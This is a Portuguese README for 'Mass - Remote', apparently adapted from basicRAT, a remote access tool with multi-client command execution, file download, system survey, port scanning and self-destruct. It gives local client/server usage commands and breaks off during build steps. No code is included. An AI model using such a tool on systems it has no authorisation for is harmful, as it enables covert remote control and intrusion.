## Mass - Remote
Atualmente ainda é um trabalho em andamento. Veja a binaries/pasta para executáveis ​​do cliente pré-construído.

## INFORMAÇÕES

_Esta mass é apenas para fins de pesquisa, e só deve ser usada em sistemas autorizados. O acesso a um sistema ou rede de computadores sem autorização ou permissão explícita é ilegal._

## CARACTERÍSTICAS

- [x] - Cross-platform (Windows, Linux e MacOS)
- [x] - Aceita conexão de vários clientes
- [x] - Execução do comando
- [x] - Utilitários padrão (cat, ls, pwd, unzip, wget)
- [x] - Pesquisa do sistema
- [x] - Auto-destruição
- [x] - Digitalização de portas primitivas
- [x] - Cliente reconectado

## USO

### Cliente
```
C:\>mass-remote --ip 127.0.0.1 --port 1337 --timeout 30
```
Onde "ip" o endereço IP do servidor, porté a porta de audiência do servidor e timeouté o número de segundos que o cliente espera para se reconectar ao servidor (se desconectado). Estes são os valores padrão se não for especificado, você provavelmente precisará fornecer pelo menos um IP e uma porta se estiver usando basicRAT fora do seu sistema local.

### Servidor
```
python mass-remote --port 1337
```

### Crie seu próprio executável autônomo
Se preferir não usar um dos binários pré-construídos, você pode facilmente criar seu próprio executável assim:
No Windows, você precisará:
- [1] - Python 2.7.x 
